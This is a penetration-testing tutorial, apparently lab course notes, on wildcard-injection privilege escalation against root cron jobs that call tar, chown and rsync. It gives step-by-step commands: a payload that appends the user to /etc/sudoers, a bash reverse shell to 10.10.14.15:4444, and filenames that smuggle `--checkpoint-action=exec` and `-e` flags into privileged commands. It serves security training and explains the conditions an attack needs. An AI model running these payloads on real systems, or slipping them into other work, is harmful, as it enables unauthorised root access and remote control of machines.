## Wildcard Abuse

Wildcard abuse is a privilege escalation technique that exploits how the shell expands wildcard characters into matching filenames before passing them to a command. If a privileged script or cron job runs a command containing a wildcard (`*`) in a directory you control, you can create files whose names look like command-line flags, causing those flags to be injected into the command when the wildcard expands. 

***

## Why It Works

The shell expands `*` before the command ever runs. If the current directory contains:

```
backup.tar.gz
--checkpoint=1
--checkpoint-action=exec=sh root.sh
root.sh
```

And a root cron job runs:

```bash
tar -zcf /home/htb-student/backup.tar.gz *
```

The shell expands `*` to all filenames in the directory. `tar` receives `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` as legitimate command-line options and acts on them. 

***

## tar Wildcard Injection (Most Common)

### The `tar` Checkpoint Options

From the `tar` man page, two flags make this possible: 

- `--checkpoint[=N]`: print a progress message every N records (default 10)
- `--checkpoint-action=ACTION`: execute ACTION at each checkpoint

When `ACTION` is `exec=<script>`, tar runs the script. The script inherits the privileges of whoever ran `tar`, which in a cron job context is root.

### Step-by-Step Exploitation

**1. Identify the vulnerable cron job:**

```bash
cat /etc/crontab
# */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

The cron job runs every minute, changes into `/home/htb-student`, and archives everything with `*`. You have write access to that directory.

**2. Write the payload script:**

```bash
# Adds current user to sudoers with full root access
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
```

Alternatively use a reverse shell payload:

```bash
echo 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1' > root.sh
chmod +x root.sh
```

**3. Create the flag injection files:**

```bash
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

**4. Verify the files exist:**

```bash
ls -la
# -rw-rw-r--  1 htb-student htb-student    1 --checkpoint=1
# -rw-rw-r--  1 htb-student htb-student    1 --checkpoint-action=exec=sh root.sh
# -rw-rw-r--  1 htb-student htb-student   60 root.sh
```

**5. Wait for the cron job and verify escalation:**

```bash
sudo -l
# (root) NOPASSWD: ALL

sudo su
# root@NIX02
```

The shell expands `*` and `tar` receives `--checkpoint=1 --checkpoint-action=exec=sh root.sh` as legitimate flags, executing `root.sh` as root. 

***

## chown Wildcard Injection

`chown` supports a `--reference=<file>` flag that sets the owner of the target file to match the owner of the reference file.  If a privileged script runs `chown root *` in a writable directory, this can be abused. 

```bash
# Create the reference file owned by you
touch reference_file

# Inject the --reference flag as a filename
touch -- "--reference=reference_file"

# When root runs: chown root *
# The wildcard expands to include --reference=reference_file
# chown uses YOUR ownership instead of root
# This can change ownership of /etc/passwd or other sensitive files back to you
```

***

## rsync Wildcard Injection

`rsync` supports a `-e` flag that specifies the remote shell command to use.  If a privileged rsync call uses a wildcard in a directory you control: 

```bash
# Create the payload
echo '#!/bin/bash\necho "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
chmod +x shell.sh

# Inject the -e flag via a filename
touch -- "-e sh shell.sh"

# When root runs: rsync -a * /backup/
# rsync receives: -e sh shell.sh as a flag and executes shell.sh
```

***

## Wildcard Injection Summary

| Command | Injected Flag | Effect |
|---|---|---|
| `tar` | `--checkpoint=1` + `--checkpoint-action=exec=sh x.sh` | Executes arbitrary script during archive |
| `chown` | `--reference=<owned_file>` | Changes file ownership to attacker-controlled user |
| `rsync` | `-e sh x.sh` | Executes arbitrary script as the remote shell |
| `7zip` | `-mmt=<payload>` | Various injection options in some versions |

***

## Detection From an Attacker's Perspective

The conditions that must be true for this attack to work are: 

1. A privileged process (root cron job, SUID script) runs a command using `*` in a directory you can write to
2. The command being used supports flags that can trigger code execution (`--checkpoint-action`, `--reference`, `-e`)
3. The wildcard is unquoted (quoted wildcards like `"*"` are passed literally and not expanded)

LinPEAS flags cron jobs ending with an asterisk wildcard in red/yellow as a known vulnerability automatically.  Always cross-check cron jobs with the write permissions you have on any directory they operate in. 
